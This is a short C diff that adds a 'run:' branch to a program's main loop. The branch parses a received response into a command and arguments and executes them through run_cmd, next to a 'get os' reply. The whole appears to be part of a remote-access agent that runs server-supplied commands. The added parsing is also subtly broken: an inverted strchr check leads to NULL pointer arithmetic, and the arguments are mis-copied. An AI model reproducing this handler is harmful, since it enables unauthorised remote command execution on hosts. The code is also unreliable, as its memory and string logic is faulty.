@@ -40,8 +40,28 @@ int main(int argc, char **argv){
         data = NULL;
         if (!strncmp(resp, "run:", 4)) {
             puts("Run command here");
-            data = (char*)malloc(strlen("Triggered")+1);
-            strcpy(data, "Triggered");
+            uint32_t resplen = strlen(resp);
+            uint32_t cmdlen = resplen-4;
+            if (cmdlen) {
+                char *cmd = (char *)malloc(sizeof(char) * (cmdlen+1));
+                strncpy(cmd,resp+4,cmdlen);
+                cmd[cmdlen] = '\0';
+                char *found;
+                if (! (found = strchr(cmd,' '))) {
+                    uint32_t loc = (uint32_t)(found-cmd+1);
+                    uint32_t arglen = (cmdlen-loc);
+                    char *args = (char *)malloc(sizeof(char) * (arglen+1));
+                    strncpy(args,found,arglen);
+                    args[arglen] = '\0';
+                    data = run_cmd(cmd,&args);
+                    free(args);
+                } else {
+                   data = run_cmd(cmd,NULL);
+                }
+                free(cmd);
+                //data = (char*)malloc(strlen("Triggered")+1);
+            }
+            //strcpy(data, "Triggered");
         }
         if (!strncmp(resp, "get os", 7)){
             data = (char*)malloc(strlen("set os:") + strlen(OS)+1);
